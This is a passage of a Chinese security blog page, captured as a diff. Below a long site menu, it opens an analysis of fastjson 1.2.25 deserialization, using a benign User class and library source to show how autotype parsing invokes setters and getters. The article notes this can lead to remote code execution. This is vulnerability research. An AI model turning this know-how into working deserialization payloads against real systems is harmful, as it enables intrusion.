+        HelloSpring
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8java%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/" class="md-nav__link">
+        Spring中使用java代码配置
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E9%85%8D%E7%BD%AE/" class="md-nav__link">
+        Spring中使用注解配置
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../spring/Spring%E4%BD%BF%E7%94%A8XML%E9%85%8D%E7%BD%AE/" class="md-nav__link">
+        Spring使用XML配置
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../spring/Spring%E7%AE%80%E4%BB%8B/" class="md-nav__link">
+        Spring简介
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../spring/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/" class="md-nav__link">
+        代理模式
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../spring/%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%28DI%29/" class="md-nav__link">
+        依赖注入(DI)
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../spring/%E6%8E%A7%E5%88%B6%E5%8F%8D%E8%BD%AC%28IOC%29/" class="md-nav__link">
+        控制反转(IOC)
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2_5" data-md-state="indeterminate" type="checkbox" id="__nav_3_2_5" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3_2_5">
+          Web
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Web" data-md-level="3">
+        <label class="md-nav__title" for="__nav_3_2_5">
+          <span class="md-nav__icon md-icon"></span>
+          Web
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/Cookie/" class="md-nav__link">
+        Cookie
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/Exercise/" class="md-nav__link">
+        Exercise
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/Filter/" class="md-nav__link">
+        Filter
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/HelloServlet/" class="md-nav__link">
+        HelloServlet
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/HttpServletRequest/" class="md-nav__link">
+        HttpServletRequest
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/HttpServletResponse/" class="md-nav__link">
+        HttpServletResponse
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/JSP/" class="md-nav__link">
+        JSP
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/JavaBean/" class="md-nav__link">
+        JavaBean
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/Listener/" class="md-nav__link">
+        Listener
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/MVC/" class="md-nav__link">
+        MVC
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/ServletContext/" class="md-nav__link">
+        ServletContext
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/Session/" class="md-nav__link">
+        Session
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/Tomcat/" class="md-nav__link">
+        Tomcat
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_3" data-md-state="indeterminate" type="checkbox" id="__nav_3_3" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3_3">
+          前人之路
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="前人之路" data-md-level="2">
+        <label class="md-nav__title" for="__nav_3_3">
+          <span class="md-nav__icon md-icon"></span>
+          前人之路
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E5%89%8D%E4%BA%BA%E4%B9%8B%E8%B7%AF/thinkphp%205.1.x%20RCE/" class="md-nav__link">
+        thinkphp 5.1.x RCE
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_4" data-md-state="indeterminate" type="checkbox" id="__nav_3_4" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3_4">
+          安全研究
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="安全研究" data-md-level="2">
+        <label class="md-nav__title" for="__nav_3_4">
+          <span class="md-nav__icon md-icon"></span>
+          安全研究
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/CodeQL%E4%B8%8Egolang%20sql%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/" class="md-nav__link">
+        CodeQL与golang sql注入检测
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/" class="md-nav__link">
+        flask不出网回显方式
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/python%E5%8F%97%E9%99%90%E7%9A%84%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8E%E9%BB%91%E9%AD%94%E6%B3%95/" class="md-nav__link">
+        python受限的任意代码执行与黑魔法
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%20to%20RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88/" class="md-nav__link">
+        register_argc_argv与include to RCE的巧妙组合
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/" class="md-nav__link">
+        webshell免杀总结
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/" class="md-nav__link">
+        任意代码执行下的php原生类利用
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_4_7" data-md-state="indeterminate" type="checkbox" id="__nav_3_4_7" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3_4_7">
+          Codeql
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Codeql" data-md-level="3">
+        <label class="md-nav__title" for="__nav_3_4_7">
+          <span class="md-nav__icon md-icon"></span>
+          Codeql
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/1.CodeQL%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/" class="md-nav__link">
+        1.CodeQL安装与使用
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/" class="md-nav__link">
+        CodeQL语法
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/codeql/" class="md-nav__link">
+        codeql Overview
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_5" data-md-state="indeterminate" type="checkbox" id="__nav_3_5" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3_5">
+          静态分析
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="静态分析" data-md-level="2">
+        <label class="md-nav__title" for="__nav_3_5">
+          <span class="md-nav__icon md-icon"></span>
+          静态分析
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/DataFlowAnalysis-Applications/" class="md-nav__link">
+        Data Flow Analysis - Applications
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/IntermediateRepresentation%28%E4%B8%AD%E9%97%B4%E8%AF%AD%E8%A8%80%29/" class="md-nav__link">
+        Intermediate Representation(中间语言)
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" data-md-state="indeterminate" type="checkbox" id="__nav_4" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4">
+          杂项
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="杂项" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          杂项
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_1" data-md-state="indeterminate" type="checkbox" id="__nav_4_1" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4_1">
+          配置
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="配置" data-md-level="2">
+        <label class="md-nav__title" for="__nav_4_1">
+          <span class="md-nav__icon md-icon"></span>
+          配置
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../%E6%9D%82%E9%A1%B9/%E9%85%8D%E7%BD%AE/%E5%85%B3%E4%BA%8Ewindows%E6%8F%90%E5%8D%87%E6%95%88%E7%8E%87%E9%82%A3%E4%BA%9B%E4%BA%8B/" class="md-nav__link">
+        关于windows提升效率那些事
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../tags.html" class="md-nav__link">
+        Tags
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+    
+        
+            <a href = "/tags.html#java" title="java" class="md-tag">
+                #java&nbsp;
+            </a>
+        
+            <a href = "/tags.html#java安全" title="java安全" class="md-tag">
+                #java安全&nbsp;
+            </a>
+        
+    
+    
+    
+    <div style="float:right"><span id="busuanzi_container_page_pv"><font size="2" color="grey">本文阅读量&nbsp;<span id="busuanzi_value_page_pv"></span></font></span></div>
+    
+  
+                
+
+<h1 id="fastjson反序列化">fastjson反序列化<a class="headerlink" href="#fastjson反序列化" title="Permanent link">#</a></h1>
+<p><strong><em>以下代码来源于fastjson1.2.25</em></strong></p>
+<blockquote>
+<p>fastjson反序列化本质上就是通过在反序列化时自动调用getter和setter方法，而某些类的getter和setter方法存在某些危险逻辑(如我们的老朋友<code>TemplatesImpl</code>)，从而达到我们的目的(如RCE)。</p>
+</blockquote>
+<h2 id="fastjson使用">fastjson使用<a class="headerlink" href="#fastjson使用" title="Permanent link">#</a></h2>
+<p>fastjson中常用到的反序列化的方法一共有三个:<br />
+- <code>JSON.parse(String)</code><br />
+- <code>JSON.parseObject(String)</code><br />
+- <code>JSON.parseObject(String, clazz)</code><br />
+这三个方法存在着一些差异，可以看后续的简略分析。详情可以见<a href="http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/">这里</a></p>
+<p>一个简单的例子如下:<br />
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">java.util.Properties</span><span class="p">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">User</span> <span class="p">{</span>
+    <span class="kd">public</span> <span class="n">Integer</span> <span class="n">id</span><span class="p">;</span>
+    <span class="kd">public</span> <span class="n">String</span> <span class="n">name</span><span class="p">;</span>
+    <span class="kd">private</span> <span class="n">Properties</span> <span class="n">t1</span><span class="p">;</span>
+
+    <span class="kd">public</span> <span class="nf">User</span><span class="p">()</span> <span class="p">{</span>
+        <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;call default constructor&quot;</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">getName</span><span class="p">()</span> <span class="p">{</span>
+        <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;call get name&quot;</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">name</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setName</span><span class="p">(</span><span class="n">String</span> <span class="n">name</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;call set name&quot;</span><span class="p">);</span>
+        <span class="k">this</span><span class="p">.</span><span class="na">name</span> <span class="o">=</span> <span class="n">name</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="kd">public</span> <span class="n">Integer</span> <span class="nf">getId</span><span class="p">()</span> <span class="p">{</span>
+        <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;call get id&quot;</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">id</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="kd">public</span> <span class="n">Properties</span> <span class="nf">getT1</span><span class="p">()</span> <span class="p">{</span>
+        <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;call get t1&quot;</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">t1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setId</span><span class="p">(</span><span class="n">Integer</span> <span class="n">id</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;call set id&quot;</span><span class="p">);</span>
+        <span class="k">this</span><span class="p">.</span><span class="na">id</span> <span class="o">=</span> <span class="n">id</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="kd">public</span> <span class="nf">User</span><span class="p">(</span><span class="n">Integer</span> <span class="n">id</span><span class="p">,</span> <span class="n">String</span> <span class="n">name</span><span class="p">,</span> <span class="n">Properties</span> <span class="n">t1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;call constructor&quot;</span><span class="p">);</span>
+        <span class="k">this</span><span class="p">.</span><span class="na">id</span> <span class="o">=</span> <span class="n">id</span><span class="p">;</span>
+        <span class="k">this</span><span class="p">.</span><span class="na">name</span> <span class="o">=</span> <span class="n">name</span><span class="p">;</span>
+        <span class="k">this</span><span class="p">.</span><span class="na">t1</span> <span class="o">=</span> <span class="n">t1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">toString</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="s">&quot;User{&quot;</span> <span class="o">+</span>
+                <span class="s">&quot;id=&quot;</span> <span class="o">+</span> <span class="n">id</span> <span class="o">+</span>
+                <span class="s">&quot;, name=&#39;&quot;</span> <span class="o">+</span> <span class="n">name</span> <span class="o">+</span> <span class="sc">&#39;\&#39;&#39;</span> <span class="o">+</span>
+                <span class="s">&quot;, t1=&quot;</span> <span class="o">+</span> <span class="n">t1</span> <span class="o">+</span>
+                <span class="sc">&#39;}&#39;</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><br />
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">com.alibaba.fastjson.parser.Feature</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="p">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Main</span> <span class="p">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="p">)</span> <span class="p">{</span>
+         <span class="n">User</span> <span class="n">u</span> <span class="o">=</span> <span class="k">new</span> <span class="n">User</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="s">&quot;tom&quot;</span><span class="p">,</span> <span class="k">new</span> <span class="n">Properties</span><span class="p">());</span>
+        <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;-------toJSONString()------&quot;</span><span class="p">);</span>
+        <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">JSON</span><span class="p">.</span><span class="na">toJSONString</span><span class="p">(</span><span class="n">u</span><span class="p">));</span>
+        <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;-------parse(str)------&quot;</span><span class="p">);</span>
+        <span class="n">ParserConfig</span><span class="p">.</span><span class="na">getGlobalInstance</span><span class="p">().</span><span class="na">setAutoTypeSupport</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+        <span class="n">String</span> <span class="n">s</span> <span class="o">=</span> <span class="s">&quot;{\&quot;@type\&quot;:\&quot;User\&quot;, \&quot;id\&quot;: 123, \&quot;name\&quot;:\&quot;Tom\&quot;, \&quot;t1\&quot;:{}}&quot;</span><span class="p">;</span>
+        <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">JSON</span><span class="p">.</span><span class="na">parse</span><span class="p">(</span><span class="n">s</span><span class="p">));</span>
+        <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;-------parseObject(str)------&quot;</span><span class="p">);</span>
+        <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">s</span><span class="p">));</span>
+        <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;-------parseObject(str, User.class)------&quot;</span><span class="p">);</span>
+        <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">User</span><span class="p">.</span><span class="na">class</span><span class="p">));</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><br />
+最后输出如下:<br />
+<div class="highlight"><pre><span></span><code>call constructor
+-------toJSONString()------
+call get id
+call get name
+call get t1
+{&quot;id&quot;:5,&quot;name&quot;:&quot;tom&quot;,&quot;t1&quot;:{}}
+-------parse(str)------
+call default constructor
+call set id
+call set name
+call get t1
+User{id=123, name=&#39;Tom&#39;, t1=null}
+-------parseObject(str)------
+call default constructor
+call set id
+call set name
+call get t1
+call get id
+call get name
+call get t1
+{&quot;name&quot;:&quot;Tom&quot;,&quot;id&quot;:123}
+-------parseObject(str, User.class)------
+call default constructor
+call set id
+call set name
+call get t1
+User{id=123, name=&#39;Tom&#39;, t1=null}
+</code></pre></div><br />
+通过上面的输出我们可以发现fastjson在序列化的时候会调用getter方法，而在反序列化时会优先调用类的无参默认构造方法，然后通过setter的方式去还原我们的对象。</p>
+<p>我们可以看到<code>parse(str)</code>和<code>parseObject(str, User.class)</code>的输出是一样的，而<code>parseObject(str)</code>的结果却不太一样。</p>
+<p>这里还有一些比较有趣的地方:<br />
+1. 为什么<code>parseObject(str)</code>和另外两个反序列化的行为不一样？(把所有的getter方法调用了一遍)<br />
+2. 为什么反序列化时会调用<code>getT1()</code>，而不会调用其他的getter方法？</p>
+<p>### 第一个问题</p>
+<blockquote>
+<p>为什么<code>parseObject(str)</code>和另外两个反序列化的行为不一样？(把所有的getter方法调用了一遍)</p>
+</blockquote>
+<p>这个方法的原因在于<code>parseObject(str)</code>时最终返回的是JSONObject，会额外调用一次<code>toJSON(obj)</code>。<br />
+<div class="highlight"><pre><span></span><code> <span class="kd">public</span> <span class="kd">static</span> <span class="n">JSONObject</span> <span class="nf">parseObject</span><span class="p">(</span><span class="n">String</span> <span class="n">text</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">parse</span><span class="p">(</span><span class="n">text</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">obj</span> <span class="k">instanceof</span> <span class="n">JSONObject</span> <span class="o">?</span> <span class="p">(</span><span class="n">JSONObject</span><span class="p">)</span><span class="n">obj</span> <span class="p">:</span> <span class="p">(</span><span class="n">JSONObject</span><span class="p">)</span><span class="n">toJSON</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div><br />
+完整的调用链如下:<br />
+<img alt="" src="https://gitee.com/guuest/images/raw/master/img/20220210160606.png" /></p>
+<blockquote>
+<p><code>toJSON()</code>方法会将目标类中所有getter方法记录下来，然后通过反射去调用了所有的getter方法</p>
+</blockquote>
+<h3 id="第二个问题">第二个问题<a class="headerlink" href="#第二个问题" title="Permanent link">#</a></h3>
+<blockquote>
+<p>为什么反序列化时会调用<code>getT1()</code>，而不会调用其他的getter方法？</p>
+</blockquote>
+<p>这个问题的答案要到<code>JavaBeanInfo.build()</code>方法中去寻找:</p>
+<blockquote>
+<p>在<code>JavaBeanInfo.build()</code>方法中，程序将会创建一个fieldList数组来存放后续将要处理的目标类的 setter方法及某些特定条件的getter方法。</p>
+</blockquote>
+<p>那么什么getter方法满足条件呢？<br />
+<div class="highlight"><pre><span></span><code><span class="k">if</span> <span class="p">(</span><span class="n">methodName</span><span class="p">.</span><span class="na">length</span><span class="p">()</span> <span class="o">&gt;=</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">Modifier</span><span class="p">.</span><span class="na">isStatic</span><span class="p">(</span><span class="n">method</span><span class="p">.</span><span class="na">getModifiers</span><span class="p">())</span> <span class="o">&amp;&amp;</span> <span class="n">methodName</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="s">&quot;get&quot;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">Character</span><span class="p">.</span><span class="na">isUpperCase</span><span class="p">(</span><span class="n">methodName</span><span class="p">.</span><span class="na">charAt</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="n">method</span><span class="p">.</span><span class="na">getParameterTypes</span><span class="p">().</span><span class="na">length</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">Collection</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">isAssignableFrom</span><span class="p">(</span><span class="n">method</span><span class="p">.</span><span class="na">getReturnType</span><span class="p">())</span> <span class="o">||</span> <span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">isAssignableFrom</span><span class="p">(</span><span class="n">method</span><span class="p">.</span><span class="na">getReturnType</span><span class="p">())</span> <span class="o">||</span> <span class="n">AtomicBoolean</span><span class="p">.</span><span class="na">class</span> <span class="o">==</span> <span class="n">method</span><span class="p">.</span><span class="na">getReturnType</span><span class="p">()</span> <span class="o">||</span> <span class="n">AtomicInteger</span><span class="p">.</span><span class="na">class</span> <span class="o">==</span> <span class="n">method</span><span class="p">.</span><span class="na">getReturnType</span><span class="p">()</span> <span class="o">||</span> <span class="n">AtomicLong</span><span class="p">.</span><span class="na">class</span> <span class="o">==</span> <span class="n">method</span><span class="p">.</span><span class="na">getReturnType</span><span class="p">()))</span>  <span class="p">{</span>
+<span class="c1">//...</span>
+<span class="p">}</span>
+<span class="c1">// 如果存在setter方法，该成员变量名会被加入fieldList，fieldInfo就不为null，那么getter方法就不会加入fieldList</span>
+<span class="n">fieldInfo</span> <span class="o">=</span> <span class="n">getField</span><span class="p">(</span><span class="n">fieldList</span><span class="p">,</span> <span class="n">propertyName</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">fieldInfo</span> <span class="o">==</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">propertyNamingStrategy</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">propertyName</span> <span class="o">=</span> <span class="n">propertyNamingStrategy</span><span class="p">.</span><span class="na">translate</span><span class="p">(</span><span class="n">propertyName</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">add</span><span class="p">(</span><span class="n">fieldList</span><span class="p">,</span> <span class="k">new</span> <span class="n">FieldInfo</span><span class="p">(</span><span class="n">propertyName</span><span class="p">,</span> <span class="n">method</span><span class="p">,</span> <span class="p">(</span><span class="n">Field</span><span class="p">)</span><span class="kc">null</span><span class="p">,</span> <span class="n">clazz</span><span class="p">,</span> <span class="n">type</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">annotation</span><span class="p">,</span> <span class="p">(</span><span class="n">JSONField</span><span class="p">)</span><span class="kc">null</span><span class="p">,</span> <span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="kc">null</span><span class="p">));</span>
+<span class="p">}</span>
